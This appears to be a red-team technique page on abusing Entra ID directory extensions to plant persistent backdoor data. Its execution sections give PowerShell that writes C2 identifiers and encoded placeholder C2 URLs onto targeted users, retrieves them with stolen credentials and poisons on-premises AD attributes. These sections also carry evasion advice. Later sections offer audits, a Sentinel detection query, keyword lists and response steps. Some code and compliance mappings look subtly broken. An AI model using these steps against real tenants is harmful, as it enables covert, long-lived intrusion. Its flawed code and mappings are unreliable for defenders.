# PERSIST-ACCT-008: Custom Directory Extensions

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-ACCT-008 |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Persistence |
| **Platforms** | Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All (Entra ID; hybrid environments with Azure AD Connect) |
| **Patched In** | N/A (feature abuse, not a vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

### Concept
Custom Directory Extensions (also called extension attributes or schema extensions) are tenant-wide custom properties that can be added to user, group, and device objects in Entra ID to store arbitrary data. Attackers can abuse this feature to create **hidden "shadow accounts"** or store **backdoor credentials/identifiers** directly on legitimate user objects where they are easily overlooked during security audits. Unlike direct credential modification (password, certificate), directory extensions are:
- **Not visible in default user property views** (must explicitly query Graph API with specific property names)
- **Can store any string data** (credentials, command payloads, C2 beacon identifiers, attacker contact information)
- **Tied to application registrations**, making them appear "legitimate" when reviewed
- **Synchronized from on-premises AD via Azure AD Connect**, enabling hybrid persistence
- **Not subject to typical credential rotation policies** (can persist for years unchanged)

An attacker can register an application, create a directory extension tied to that app, then populate user objects with attacker-controlled data (e.g., `extension_3e3e6f47b2294e5a8d7b1234_PayloadID = "C2BeaconID-12345"`). This data persists silently and can be queried via Microsoft Graph API using only the specific extension property name—making it invisible to administrators who don't know which extensions to monitor.

### Attack Surface
The attack surface includes:
- **Application registrations** (can register app to anchor custom extensions)
- **Directory extensions** created via `New-MgSchemaExtension` or Graph API
- **User, group, and device objects** that can be populated with extension data
- **Azure AD Connect sync** (if hybrid, extensions sync from on-premises AD)
- **Microsoft Graph API** (queried using extension property names to retrieve stored data)
- **Dynamic group rules** that filter based on extension attributes

### Business Impact
**Persistent backdoor access with low forensic visibility, privilege escalation chains, and supply chain compromise.** An attacker can store malware C2 identifiers, command payloads, or authentication tokens in extension attributes on thousands of user objects. This enables:
- **Dormant persistence**: Attacker stores C2 beacon identifier in user extension; days/weeks later, code on compromised endpoint queries Graph API for this data to receive commands
- **Privilege escalation**: Attacker creates extension for storing "admin role override codes"; when combined with conditional access policy, these codes can bypass MFA
- **Lateral movement**: Attacker stores partner/customer API keys in extension attributes; later exfiltrates to compromise supply chain
- **Forensic evasion**: Extension data is not visible in normal user property views; standard audits miss it

During the Agder Cloud research (2025), security researchers demonstrated how custom extensions can be used to implement "governance backdoors"—attackers create seemingly legitimate extensions to modify which users are eligible for sensitive roles, then populate these extensions with attacker-controlled values.

### Technical Context
Directory extension creation/population typically takes **5-10 minutes** once an attacker has access to Graph API with `Directory.ReadWrite.All` or `User.ReadWrite.All` permissions. **Detection difficulty: High** (requires monitoring for `New-MgSchemaExtension` operations and periodic audits of populated extension values across all user objects). Most organizations do not monitor extension creation or population; extensions appear in audit logs but are often missed without targeted detection rules.

### Operational Risk
- **Execution Risk:** Low—once an attacker has permissions to create extensions and modify users, population is a simple batch operation
- **Stealth:** Very High—extensions are invisible unless specifically queried by property name; not displayed in Azure Portal user properties by default
- **Reversibility:** Hard—requires systematic audit of all custom extensions and bulk deletion of populated values

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 3.1.2 | Ensure that MFA is enabled for all non-federated users in M365 |
| **CIS Benchmark** | 1.5.1 | Ensure that only authorized users can access sign-up with data residency settings |
| **DISA STIG** | V-222642 | The application must protect user data from unauthorized disclosure through encryption mechanisms |
| **DISA STIG** | V-222664 | The application must implement role-based access control (RBAC) that restricts access to sensitive information |
| **NIST 800-53** | AC-3 | Access Enforcement – Custom attributes must be protected from unauthorized modification |
| **NIST 800-53** | AU-2 | Audit Events – Extension creation and modification must be logged |
| **NIST 800-53** | SC-28 | Protection of Information at Rest – Extension data containing credentials must be encrypted |
| **NIST 800-63B** | 5.1.4.1 | Storage Security – Secrets stored in extensions must use approved cryptography |
| **GDPR** | Art. 32 | Security of Processing – Custom data fields must be protected; unauthorized access violates security |
| **GDPR** | Art. 5(1)(a) | Lawfulness – Extension data must have legal basis for collection; attacker data lacks consent |
| **DORA** | Art. 6 | Governance – Custom attributes must be subject to governance controls |
| **DORA** | Art. 16 | ICT Third-Party Risk – Third-party data stored in extensions must be audited |
| **NIS2** | Art. 21 | Cyber risk management – Access control for identity attributes is mandatory |
| **ISO 27001** | A.8.2.1 | User identification and authentication – Custom attributes must not undermine authentication |
| **ISO 27001** | A.8.2.3 | User responsibilities – Users should not be aware of unauthorized attribute changes |
| **ISO 27001** | A.13.1.1 | Information handling – Custom data handling must be clearly defined |
| **ISO 27005** | Risk scenario | Unauthorized attribute modification leading to privilege escalation and data breach |

---

## 3. TECHNICAL PREREQUISITES

### Required Privileges
- **For extension creation:** Application Developer or Global Administrator role
- **For extension population:** User.ReadWrite.All or Directory.ReadWrite.All (application or delegated permissions)
- **For querying extensions:** User.Read.All (minimal; only requires read access)

### Required Access
- Access to **Microsoft Graph API** (via PowerShell, Postman, or custom scripts)
- **Entra ID application registration** (to anchor extensions; can be existing app)
- Network access to `https://graph.microsoft.com`
- For hybrid: Access to **Azure AD Connect** and on-premises AD schema extensions

### Supported Versions
- **Entra ID:** All versions
- **Azure AD Connect:** 1.0+ (if syncing extensions from on-premises)
- **PowerShell:** Version 5.0+ (Windows) or PowerShell 7.x (cross-platform)
- **Microsoft.Graph Module:** Version 2.0+

### Tools
- [Microsoft.Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell) (Version 2.0+)
- [Entra Module](https://learn.microsoft.com/en-us/powershell/module/microsoft.entra/) (Alternative to Graph)
- [Azure AD Connect](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-install-roadmap) (For hybrid scenarios)
- [Microsoft 365 CLI](https://pnp.github.io/cli-microsoft365/) (Alternative to PowerShell)
- [Postman](https://www.postman.com/) (For REST API testing)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

**Objective:** Enumerate existing directory extensions and identify which applications own them.

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Directory.Read.All", "Application.Read.All"

# List all schema extensions (directory extensions) in the tenant
Get-MgSchemaExtension | Select-Object Id, Owner, TargetTypes, Properties, Status

# For each extension, identify the owning application
$extensions = Get-MgSchemaExtension

foreach ($ext in $extensions) {
    Write-Host "Extension: $($ext.Id)"
    Write-Host "  Owner: $($ext.Owner)"
    Write-Host "  Properties: $($ext.Properties.Name -join ', ')"
    
    # Get owning application details
    $appId = $ext.Owner
    $app = Get-MgApplication -Filter "appId eq '$appId'"
    
    if ($app) {
        Write-Host "  Owned by Application: $($app.DisplayName)"
        Write-Host "  App Owners: $(Get-MgApplicationOwner -ApplicationId $app.Id | Select -ExpandProperty DisplayName)"
    }
}

# Check for suspicious extensions (e.g., owned by third-party or attacker apps)
Get-MgSchemaExtension | Where-Object {
    $_.Owner -notmatch "Tenant Schema Extension App"  # Microsoft's built-in app
} | Select-Object Id, Owner, Properties

# Audit populated extension values on users (check for suspicious data)
$users = Get-MgUser -All -Property "id,displayName,onPremisesExtensionAttributes"

foreach ($user in $users) {
    if ($user.OnPremisesExtensionAttributes) {
        Write-Host "User: $($user.DisplayName)"
        Write-Host "  Extension Attributes: $(ConvertTo-Json $user.OnPremisesExtensionAttributes)"
    }
}
```

**What to Look For:**
- Extensions **owned by unfamiliar applications** (not tenant schema extension app)
- Extensions with **suspicious property names** (e.g., "Payload", "Backdoor", "C2ID", "AuthOverride")
- Custom applications with **excessive extension properties**
- Extensions **populated with URL-like values** (C2 beacons) or **base64-encoded data** (obfuscated payloads)
- Extensions synced from **on-premises AD** (may have been modified by attacker there)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Create Directory Extension via Application & Populate with Backdoor Identifier

**Supported Versions:** All Entra ID versions

#### Step 1: Create or Identify Target Application

**Objective:** Anchor directory extensions to an application (legitimate or attacker-created).

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Directory.ReadWrite.All", "Application.ReadWrite.All"

# Option A: Use existing application (less suspicious)
$targetApp = Get-MgApplication -Filter "displayName eq 'Existing-High-Permission-App'"

# Option B: Create new application (more control but more detectable)
$newApp = New-MgApplication -DisplayName "Tenant Schema Extension Manager"
$appId = $newApp.AppId

Write-Host "Target Application ID: $appId"
Write-Host "Application: $($newApp.DisplayName)"
```

**OpSec & Evasion:**
- Target **existing applications** rather than creating new ones (blend with legitimate activity)
- Use application names that sound **administrative/technical** ("Schema Manager", "Governance Extensions", "Identity Governance")
- Ensure the target application has **Owner permissions** (don't use newly created apps with no owners)

#### Step 2: Create Custom Directory Extension

**Objective:** Define a custom property that can store attacker data.

```powershell
# Define extension property
$extensionName = "BackdoorPayloadID"  # Or use legitimate-sounding name like "GovernanceLevel"
$targetObjectTypes = "User"  # Can also be "Group" or "Device"

# Create schema extension
$schemaExtension = New-MgSchemaExtension -Id "extension_$($appId.Replace('-', ''))_$extensionName" `
    -Owner $appId `
    -Schema @{
        BaseType = $targetObjectTypes
        Properties = @(
            @{
                Name = $extensionName
                Type = "String"  # Can store any string data (credentials, URLs, commands)
            }
        )
    } `
    -TargetTypes $targetObjectTypes `
    -Properties @{
        "$extensionName" = "String"
    }

Write-Host "Directory Extension Created:"
Write-Host "  Extension ID: $($schemaExtension.Id)"
Write-Host "  Property Name: $extensionName"
Write-Host "  Can now populate users with custom data"
```

**Expected Output:**
```
Directory Extension Created:
  Extension ID: extension_3e3e6f47b2294e5a8d7b1234fabc1234_BackdoorPayloadID
  Property Name: BackdoorPayloadID
  Can now populate users with custom data
```

**What This Means:**
- Extension is now available for use across all User objects in the tenant
- Property name is tied to the owning application, making it appear "legitimate" when reviewed
- Data can be populated/queried via Microsoft Graph using the extension name

**OpSec & Evasion:**
- Use **neutral property names** like "GovernanceLevel", "ComplianceStatus", "LifecycleRole", "AccessLevel"
- Create extensions on **existing organizational applications** rather than new ones
- Extensions are visible in audit logs but often overlooked without targeted monitoring

#### Step 3: Populate User Objects with Backdoor Data

**Objective:** Store attacker-controlled data (C2 identifier, credential, command) in extension attributes.

```powershell
# Define the backdoor data to store
$backdoorData = @{
    BackdoorPayloadID = "C2-Beacon-ID-12345"  # Or any attacker-controlled identifier
}

# Target users to compromise (e.g., executives, service accounts)
$targetUsers = Get-MgUser -Filter "department eq 'Finance'" -All

foreach ($user in $targetUsers) {
    # Prepare update payload
    $updateParams = @{
        OnPremisesExtensionAttributes = $backdoorData
    }
    
    # Update user with extension data
    Update-MgUser -UserId $user.Id -BodyParameter $updateParams
    
    Write-Host "Updated user: $($user.DisplayName) with backdoor identifier"
}

# Verify data was stored
$verifyUser = Get-MgUser -UserId $targetUsers[0].Id -Property "onPremisesExtensionAttributes"
Write-Host "Verification - Extension data: $(ConvertTo-Json $verifyUser.OnPremisesExtensionAttributes)"
```

**What This Means:**
- Attacker data is now stored on user objects
- Data persists even if user password is reset or MFA is enabled
- Only visible when specifically querying the extension property name

**OpSec & Evasion:**
- Populate extensions **gradually** (not all users at once; avoids audit alerts)
- Use **target-specific data** rather than generic identifiers (e.g., encode user's department or role in the ID)
- Store data in **base64 or simple ciphers** if it contains sensitive information (harder to read at first glance)
- Populate **legitimate-looking values** (e.g., `GovernanceLevel = "Contractor"`, `ComplianceStatus = "PII-Data-Handler"`)

**Variant: Store Encoded Payload**

```powershell
# Encode attacker command/C2 address as base64
$c2Address = "https://attacker-c2-server.com/beacon"
$encodedPayload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($c2Address))

# Store in extension
$updateParams = @{
    OnPremisesExtensionAttributes = @{
        BackdoorPayloadID = $encodedPayload
    }
}

Update-MgUser -UserId $userId -BodyParameter $updateParams
```

---

### METHOD 2: Query Stored Extension Data via Microsoft Graph (Attacker Retrieval)

**Supported Versions:** All Entra ID versions

#### Step 1: Authenticate as Compromised User with User.Read.All Permissions

**Objective:** Attacker code queries Graph API to retrieve backdoor data.

```powershell
# Attacker code can be:
# 1. Malware on compromised endpoint
# 2. Browser extension injected via XSS
# 3. Cloud function triggered by scheduled task
# 4. SharePoint/Teams bot with hidden permissions

# Connect using credentials obtained from phishing/compromise
$credential = Get-Credential  # Attacker's compromised user credentials

Connect-MgGraph -Credential $credential -Scopes "User.Read.All"
```

#### Step 2: Query All Users for Extension Data

**Objective:** Retrieve backdoor identifiers from populated user objects.

```powershell
# Query all users and fetch extension attributes
$users = Get-MgUser -All -Property "id,displayName,onPremisesExtensionAttributes"

# Extract backdoor data
foreach ($user in $users) {
    if ($user.OnPremisesExtensionAttributes.BackdoorPayloadID) {
        $payloadId = $user.OnPremisesExtensionAttributes.BackdoorPayloadID
        
        Write-Host "Found backdoor data on user: $($user.DisplayName)"
        Write-Host "  Payload ID: $payloadId"
        
        # Decode if base64-encoded
        try {
            $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payloadId))
            Write-Host "  Decoded: $decoded"
        } catch {
            Write-Host "  (Not base64-encoded)"
        }
    }
}

# Use retrieved data to establish C2 or obtain commands
```

**What This Means:**
- Attacker code can silently retrieve stored backdoor identifiers
- Data is queried from Graph API, not from endpoints or network traffic
- Enables **dormant persistence**: days/weeks after initial compromise, attacker code wakes up and queries this data to receive commands

---

### METHOD 3: Leverage Extensions for Privilege Escalation via Conditional Access Bypass

**Supported Versions:** Entra ID with Conditional Access Premium

#### Step 1: Create Extension Representing "Admin Override Code"

```powershell
# Create directory extension for storing privilege escalation codes
$escalationExt = New-MgSchemaExtension -Id "extension_$($appId.Replace('-', ''))_AdminOverrideCode" `
    -Owner $appId `
    -TargetTypes "User" `
    -Properties @{
        AdminOverrideCode = "String"
    }

Write-Host "Created escalation extension: $($escalationExt.Id)"
```

#### Step 2: Populate with "Override Codes"

```powershell
# Attacker stores override codes on user objects
$overrideCodes = @(
    "OVERRIDE-001",
    "OVERRIDE-002",
    "OVERRIDE-003"
)

$targetUser = Get-MgUser -Filter "userPrincipalName eq 'executive@contoso.com'"

Update-MgUser -UserId $targetUser.Id -BodyParameter @{
    OnPremisesExtensionAttributes = @{
        AdminOverrideCode = $overrideCodes[0]
    }
}
```

#### Step 3: Create Conditional Access Policy Using Extension (Requires Admin Access)

```powershell
# If attacker has Global Admin, can create policy that checks extension:
# "If AdminOverrideCode is present, allow access to sensitive apps even without MFA"

# This step requires manual configuration in Azure Portal or advanced policy APIs
# Demonstrates how extensions can be weaponized in multi-step escalation
```

**Impact:**
- Attacker embeds "bypass codes" in user extensions
- Subsequent attacks (e.g., compromised credentials) can check for these codes
- Conditional Access policies can be configured to allow sensitive access if code is present
- Enables **invisible privilege escalation** chains

---

### METHOD 4: Sync Extensions from On-Premises AD (Hybrid Persistence)

**Supported Versions:** Hybrid AD with Azure AD Connect

#### Step 1: Modify On-Premises AD Custom Attributes (extensionAttribute1-15)

**Objective:** Poison AD so that attacker data syncs to Entra ID.

```powershell
# On-premises PowerShell (domain admin required)
$user = Get-ADUser -Identity "john.doe"

# Set custom attribute with backdoor data
Set-ADUser -Identity $user -Replace @{
    extensionAttribute1 = "C2-ID-12345"
    extensionAttribute2 = "https://attacker-c2.com"
}

Write-Host "On-premises AD user updated with backdoor attributes"
```

#### Step 2: Configure Azure AD Connect to Sync Extensions

**Objective:** Force Azure AD Connect to sync the poisoned attributes to Entra ID.

```powershell
# Via Azure AD Connect GUI:
# 1. Open Azure AD Connect
# 2. Click "Configure directory extensions"
# 3. Select the custom attributes to sync (extensionAttribute1, extensionAttribute2, etc.)
# 4. Click "Refresh" to apply sync
# 5. Run a sync cycle

# OR via PowerShell on Azure AD Connect server:
# Trigger sync
Start-ADSyncSyncCycle -PolicyType Delta
```

**Impact:**
- Attacker data synced from on-premises AD to Entra ID
- Persists even after cloud-only accounts are compromised
- Hybrid environments enable **cross-platform persistence**
- On-premises administrators may not recognize the backdoor (looks like legitimate user attributes)

**OpSec & Evasion:**
- Use **common attribute names** (extensionAttribute1-5 are often used)
- Populate attributes **on service accounts** (less likely to be audited)
- Wait **days/weeks** before syncing to avoid triggering audit alerts

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1.1: Audit and Control Directory Extension Creation**

Restrict who can create directory extensions and require approval.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Apps** → **App registrations**
2. Click **All applications** to see all apps in tenant
3. For each app, review **Owners** and **Permissions**
4. If app has `Directory.ReadWrite.All` permission, verify it's legitimate
5. **Remove non-essential apps** to reduce extension creation attack surface

**PowerShell Audit:**
```powershell
# List all applications with Directory.ReadWrite.All permission
$apps = Get-MgApplication -All

foreach ($app in $apps) {
    $permissions = Get-MgApplicationPermission -ApplicationId $app.Id
    
    if ($permissions | Where-Object { $_.Name -eq "Directory.ReadWrite.All" }) {
        Write-Host "RISK: $($app.DisplayName) has Directory.ReadWrite.All permission"
        Write-Host "  Owners: $(Get-MgApplicationOwner -ApplicationId $app.Id | Select -ExpandProperty DisplayName)"
    }
}

# List all schema extensions
$extensions = Get-MgSchemaExtension

foreach ($ext in $extensions) {
    Write-Host "Extension: $($ext.Id)"
    Write-Host "  Owner App: $($ext.Owner)"
    Write-Host "  Properties: $($ext.Properties.Name -join ', ')"
}
```

---

**Mitigation 1.2: Disable Unnecessary Directory Extensions**

Remove extensions that are not required for business operations.

```powershell
# Identify extensions to remove
$extensionsToRemove = Get-MgSchemaExtension | Where-Object {
    $_.Owner -notmatch "Tenant Schema Extension App" -and
    $_.Properties.Name -match "Backdoor|Payload|Override|C2"
}

# Delete suspicious extensions
foreach ($ext in $extensionsToRemove) {
    Remove-MgSchemaExtension -SchemaExtensionId $ext.Id
    Write-Host "Removed extension: $($ext.Id)"
}
```

---

**Mitigation 1.3: Monitor Extension Population and Modification**

Detect when extensions are populated with data.

**Manual Steps (Microsoft Sentinel):**
```kusto
// Detect user object modifications that include extension attributes
AuditLogs
| where OperationName in ("Update user", "Patch user")
| where TargetResources[0].modifiedProperties contains "extensionAttribute"
| extend ModifiedUser = tostring(TargetResources[0].displayName)
| extend ExtensionModified = TargetResources[0].modifiedProperties
| project TimeGenerated, ModifiedUser, ExtensionModified, InitiatedBy = tostring(InitiatedBy.user.userPrincipalName)
| where TimeGenerated > ago(24h)
```

Deploy as **Alert Rule** with:
- **Frequency:** Run every hour
- **Severity:** Medium
- **Action:** Alert security team

---

### Priority 2: HIGH

**Mitigation 2.1: Regular Audit of Extension Values**

Systematically review populated extension attributes to identify suspicious data.

```powershell
# Audit extension values on all users
$suspiciousValues = @("http", "https", "payload", "backdoor", "c2", "beacon", "command", "override")

$users = Get-MgUser -All -Property "id,displayName,onPremisesExtensionAttributes"

foreach ($user in $users) {
    if ($user.OnPremisesExtensionAttributes) {
        foreach ($attr in $user.OnPremisesExtensionAttributes.PSObject.Properties) {
            $value = $attr.Value
            
            # Check for suspicious patterns
            foreach ($suspicious in $suspiciousValues) {
                if ($value -match $suspicious) {
                    Write-Host "SUSPICIOUS: User $($user.DisplayName) has attribute $($attr.Name) = $value"
                }
            }
        }
    }
}

# Export full audit report
$users | Select-Object DisplayName, OnPremisesExtensionAttributes | Export-Csv -Path "C:\Reports\ExtensionAudit.csv"
```

---

**Mitigation 2.2: Restrict Application Permissions**

Limit which applications can read/write extension attributes.

**Manual Steps:**
1. **Entra ID** → **Roles and administrators** → **Privileged Authentication Administrator**
2. Assign only to **trusted service accounts**
3. Review all applications with **User.ReadWrite.All** or **Directory.ReadWrite.All**
4. **Revoke permissions** from non-essential apps

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Audit Events:**
- Operation: `Add schema extension` OR `Update user` with `modifiedProperties` containing `extensionAttribute`
- Created by: Non-standard admin account or service principal
- Extension names: `BackdoorPayloadID`, `C2ID`, `OverrideCode`, `AdminBypass`, anything with unusual naming

**Suspicious Data Patterns:**
- **URLs**: `http`, `https`, `ftp` in extension values (C2 addresses)
- **Base64-encoded data**: Encoded payloads or commands
- **GUIDs or long hex strings**: Beacon identifiers or tokens
- **Keywords**: "payload", "backdoor", "command", "override", "bypass", "C2"

---

### Forensic Artifacts

**Cloud Artifacts (Office 365 Audit Logs):**
```powershell
# Export all schema extension creation events
Search-UnifiedAuditLog -Operations "Add schema extension" -StartDate (Get-Date).AddDays(-90) `
    | Export-Csv -Path "C:\Forensics\SchemaExtensionCreation.csv"

# Export all user modification events (last 30 days)
Search-UnifiedAuditLog -Operations "Update user" -StartDate (Get-Date).AddDays(-30) `
    | Where-Object { $_.AuditData -like "*extensionAttribute*" } `
    | Export-Csv -Path "C:\Forensics\UserExtensionModifications.csv"

# Dump all extension values from all users
$allUsers = Get-MgUser -All -Property "onPremisesExtensionAttributes"
$allUsers | Where-Object { $_.OnPremisesExtensionAttributes } `
    | Select-Object DisplayName, OnPremisesExtensionAttributes `
    | Export-Csv -Path "C:\Forensics\AllExtensionValues.csv"
```

**On-Premises Evidence (Hybrid AD):**
- Location: Active Directory Users and Computers → User Properties → Attribute Editor
- Look for non-standard values in `extensionAttribute1-15`
- Check Azure AD Connect sync log for extension sync events

---

### Response Procedures

#### 1. Identify All Compromised Extensions and Users

**Objective:** Enumerate scope of compromise.

```powershell
# Get all schema extensions
$extensions = Get-MgSchemaExtension

# For each extension, get populated users
foreach ($ext in $extensions) {
    Write-Host "Extension: $($ext.Id)"
    Write-Host "  Properties: $($ext.Properties.Name -join ', ')"
    
    # Query all users to find which ones have this extension populated
    $property = "extension_$($ext.Id.Split('_')[1])_$($ext.Properties[0].Name)"
    
    # This requires querying users with the specific extension property
    $usersWithExt = Get-MgUser -All -Property "id,displayName,$property" `
        | Where-Object { $_.AdditionalProperties[$property] }
    
    Write-Host "  Populated on $($usersWithExt.Count) users"
    
    $usersWithExt | Export-Csv -Path "C:\Forensics\Extension_$($ext.Id)_Users.csv"
}
```

---

#### 2. Remove Malicious Extension Data

**Objective:** Clear compromised values.

```powershell
# Get all users
$users = Get-MgUser -All -Property "onPremisesExtensionAttributes"

foreach ($user in $users) {
    if ($user.OnPremisesExtensionAttributes) {
        # Clear all extension attributes
        Update-MgUser -UserId $user.Id -BodyParameter @{
            OnPremisesExtensionAttributes = @{}  # Empty hash table removes all extensions
        }
        
        Write-Host "Cleared extensions for user: $($user.DisplayName)"
    }
}
```

---

#### 3. Delete Malicious Extensions

**Objective:** Remove compromised schema extensions.

```powershell
# Get suspicious extensions
$suspiciousExts = Get-MgSchemaExtension | Where-Object {
    $_.Properties.Name -match "Backdoor|Payload|C2|Override|Bypass"
}

foreach ($ext in $suspiciousExts) {
    Remove-MgSchemaExtension -SchemaExtensionId $ext.Id -Confirm:$false
    Write-Host "Deleted schema extension: $($ext.Id)"
}
```

---

#### 4. Review and Restrict Application Permissions

**Objective:** Prevent further abuse.

```powershell
# Remove Directory.ReadWrite.All from risky applications
$apps = Get-MgApplication -All

foreach ($app in $apps) {
    $permissions = Get-MgApplicationPermission -ApplicationId $app.Id
    
    if ($permissions | Where-Object { $_.Name -eq "Directory.ReadWrite.All" }) {
        # Check if app is legitimate
        $owners = Get-MgApplicationOwner -ApplicationId $app.Id
        
        if ($owners -eq "Attacker" -or $owners.Count -eq 0) {
            Write-Host "REMOVING Directory.ReadWrite.All from: $($app.DisplayName)"
            # Manually revoke via Azure Portal (automatic revocation not supported via PS)
        }
    }
}
```

---

#### 5. Investigate Related Lateral Movement

**Objective:** Determine what attacker accessed using stored data.

```powershell
# Query sign-in logs for unusual patterns related to users with extensions
$usersWithExtensions = Get-MgUser -All -Property "id,displayName,onPremisesExtensionAttributes" `
    | Where-Object { $_.OnPremisesExtensionAttributes }

foreach ($user in $usersWithExtensions) {
    # Check sign-in activity for this user in the last 30 days
    $signins = Get-MgAuditLogSignIn -Filter "userId eq '$($user.Id)'" -All
    
    Write-Host "User: $($user.DisplayName)"
    Write-Host "  Sign-ins in last 30 days: $($signins.Count)"
    Write-Host "  Unique locations: $(($signins | Select -ExpandProperty Location | Sort -Unique).Count)"
}
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001](../02_Initial/IA-PHISH-001_DeviceCode.md) | Phishing or password spray to compromise user with Graph API permissions |
| **2** | **Privilege Escalation** | [PE-VALID-010](../04_PrivEsc/PE-VALID-010_AzureRole.md) | Escalate to Global Admin or Application Administrator |
| **3** | **Persistence Setup** | **[PERSIST-ACCT-008]** | **Create directory extensions and populate with backdoor identifiers** |
| **4** | **Persistence Retrieval** | **Query Graph API** | Malware/script queries extensions to retrieve C2 addresses or commands |
| **5** | **Defense Evasion** | [EVADE-IMPAIR-007](../06_Evasion/EVADE-IMPAIR-007_AuditLog.md) | Clear audit logs to hide extension creation/modification |
| **6** | **Lateral Movement** | **Decode extension data** | Attacker uses stored credentials/identifiers to move to other systems |
| **7** | **Impact** | **Long-term Persistence** | Attacker maintains access via silent extension data queries |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Agder Cloud Research – "Governance Backdoors" (2025)

**Target:** Simulated Entra ID environment for security research

**Timeline:**
- **October 2025:** Security researchers at Agder Cloud discovered that directory extensions can be weaponized as "governance backdoors"
- **November 2025:** Proof-of-concept demonstrated creating extensions for privilege escalation rules

**Technique Status:** ACTIVE (theoretical but technically feasible). Researchers showed how attackers could:
1. Create a directory extension called `extension_AppID_EligibleForGlobalAdminRole`
2. Populate this extension on attacker's account with value `"True"`
3. Create Conditional Access or dynamic group rules that check this extension
4. Attacker's account is automatically granted Global Admin based on extension value

**Attack Flow:**
- Attacker has Global Admin privileges (achieved via earlier escalation)
- Creates extension to encode "admin eligibility" markers
- Creates dynamic rules that grant roles based on extension values
- Later, when attacker's primary access is revoked, other compromised accounts check the extension
- Accounts with the extension value are automatically granted elevated roles

**Impact:**
- **Invisible privilege escalation**: Rules appear legitimate when reviewed
- **Persistent elevation**: Continues working even if attacker's primary account is deleted
- **Hard to detect**: Extension data is not visible in standard audits

**Reference:**
- [Agder Cloud: Solving Governance Gaps in Entra ID with Directory Extensions](https://agderinthe.cloud/2025/10/31/solving-governance-gaps-in-entra-id-with-directory-extensions/)

---

### Example 2: Hybrid AD Attacks – On-Premises Poisoning Syncs to Cloud (2023-2024)

**Target:** Organizations using Azure AD Connect with extension attribute sync enabled

**Technique Status:** ACTIVE. Attackers compromised on-premises AD and poisoned custom attributes:
1. Gained domain admin access to on-premises AD
2. Modified `extensionAttribute1-5` on service accounts with C2 identifiers
3. Azure AD Connect automatically synced these values to Entra ID
4. Malware on compromised endpoints queried Graph API to retrieve C2 addresses
5. Established undetectable persistence across on-premises and cloud

**Attack Chain:**
- On-premises compromise (via password spray, phishing, etc.)
- Privilege escalation to domain admin
- Modify service account extension attributes with backdoor data
- Wait for Azure AD Connect sync cycle (typically every 30 minutes)
- Cloud-based malware queries extensions to retrieve C2 addresses
- Attacker maintains persistent access despite cloud-only remediation efforts

**Persistence Characteristics:**
- Persists through AD password resets (extensions sync separately)
- Not visible in cloud-only audits (stored in on-premises AD)
- Syncs automatically on every AD Connect cycle
- Difficult to detect without monitoring both on-premises and cloud

**Reference:**
- Microsoft Threat Intelligence reports on hybrid AD attacks (2023-2024)

---

### Example 3: Supply Chain Escalation via Directory Extensions (Theoretical Scenario)

**Target:** MSP (Managed Service Provider) with multi-tenant access

**Scenario:**
1. Attacker compromises MSP's Global Admin account
2. Creates directory extensions on customer objects storing partner API keys
3. Populates extensions with API credentials for MSP's customers
4. Attacker later queries extensions via Graph API to obtain customer credentials
5. Uses customer credentials to compromise supply chain partners

**Impact:**
- **Lateral escalation**: Single compromise enables supply chain attacks
- **Credential harvesting**: Extensions store credentials from multiple organizations
- **Invisible data theft**: Extensions not visible to customers' security teams

---

---

## REFERENCES & AUTHORITATIVE SOURCES

### Microsoft Official Documentation
- [Directory Extensions (Schema Extensions)](https://learn.microsoft.com/en-us/graph/extensibility-overview)
- [Working with Directory Extensions via Graph API](https://learn.microsoft.com/en-us/graph/api/schemaextension-post-schemaextensions)
- [OnPremisesExtensionAttributes](https://learn.microsoft.com/en-us/graph/api/resources/user#onpremisesextensionattributes)
- [Azure AD Connect Directory Extensions](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sync-feature-directory-extensions)
- [Custom Security Attributes in Entra ID](https://learn.microsoft.com/en-us/entra/identity/users/users-custom-security-attributes)

### Security Research & Analysis
- [Agder Cloud: Solving Governance Gaps in Entra ID with Directory Extensions](https://agderinthe.cloud/2025/10/31/solving-governance-gaps-in-entra-id-with-directory-extensions/)
- [Identity Managed: Custom Attributes in Entra ID](https://identitymanaged.com/blog/2025/09/custom-attributes-in-entra-id/)
- [Michev IT: Working with Custom Attributes via Graph SDK](https://michev.info/blog/post/6493/working-with-custom-attributes-via-the-graph-sdk-for-powershell-and-the-entra-module)
- [Tenable: Abusing Client-Side Extensions (CSE) for Backdoors](https://www.tenable.com/blog/abusing-client-side-extensions-cse-a-backdoor-into-your-ad-environment)

### Detection & Incident Response
- [Practical365: Detecting Midnight Blizzard Using Microsoft Sentinel](https://practical365.com/detecting-midnight-blizzard-using-microsoft-sentinel/)
- [Microsoft Sentinel Graph Analytics](https://techcommunity.microsoft.com/blog/microsoft-security-blog/uncover-hidden-security-risks-with-microsoft-sentinel-graph/)

### Red Teaming & Research
- [Cloud-Architekt: AzureAD Attack Defense Research](https://github.com/Cloud-Architekt/AzureAD-Attack-Defense)
- [MITRE ATT&CK: Account Manipulation (T1098)](https://attack.mitre.org/techniques/T1098/)
